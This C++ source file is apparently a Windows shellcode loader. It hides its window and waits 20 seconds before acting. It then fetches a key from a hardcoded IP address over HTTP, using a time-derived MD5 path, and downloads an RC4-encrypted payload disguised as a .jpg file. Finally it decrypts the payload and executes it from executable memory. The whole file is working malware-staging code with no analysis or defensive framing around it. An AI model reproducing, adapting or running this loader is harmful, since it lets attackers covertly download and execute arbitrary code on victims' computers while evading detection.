#include <windows.h>  
#include <stdio.h>  
#include <string>
#include "b64/base64.h"
//#include <string.h>

#include "EsyGet/HttpRequest.h"
#include "Md5/md5.h"
#include <iostream>
#include <time.h>
#include "rc4/ARC4.h"
//data段可读写  
//#pragma comment(linker, "/section:.data,RWE")   
//不显示窗口  
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  
#pragma comment(linker, "/INCREMENTAL:NO")

const char target[] = "192.3.176.232";
const int  port = 81;
const char obscure[] = "vtyuiaslkjfasfalsflkhlksadjlkgjlkdsajglkadnlkgsd";
typedef void(__stdcall *CODE) ();
char * shellcode = (char *)malloc(835);

std::string GenerateUri()
{
	time_t myt = time(NULL);
	int key = int(int(myt) / 100);
	std::string u = string(obscure) + std::to_string(key);
	return MD5(u).toStr();
}
std::string GetKey()
{
	std::string host = std::string(target);
	HttpRequest httpReq(host, port);
	std::string res = httpReq.HttpGet("/"+ GenerateUri());

	std::string body = httpReq.getBody(res);
	//std::cout << body << std::endl;
	return body;
}
void LoadShellCode(char *shellcode)
{
	PVOID p = NULL;
	p = VirtualAlloc(NULL, 835, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy_s(p, 835, shellcode, 835);
	CODE code = (CODE)p;
	code();
	
}

void DecPayload(std::string key)
{
	std::string host = std::string(target);
	HttpRequest httpReq(host, port);
	time_t myt = time(NULL);
	int filename = int(int(myt) / 10);

	std::string res = httpReq.HttpGet("/"+ std::to_string(filename)+".jpg");
	std::string body = httpReq.getBody(res);
	std::string payload = base64_decode(body);
	//std::cout << body << std::endl;
	//std::cout << body.length() << std::endl;
	//std::cout << body.size() << std::endl;
	char * c_payload = (char *)malloc(835);
	memcpy_s(c_payload,835, payload.c_str(),835);

	//char * c_key = (char *)malloc(key.size() + 1);
	//strcpy_s(c_key, key.size() + 1, key.c_str());
	ARC4 rc4;
	rc4.setKey((unsigned char*)key.c_str(), key.length());
	rc4.encrypt(c_payload, shellcode, 835);

	LoadShellCode(shellcode);
	
}

int main()  
{  
	Sleep(20000);

	DecPayload(GetKey());
	//test();
	//LoadShellCode2();

    return 0;  
}  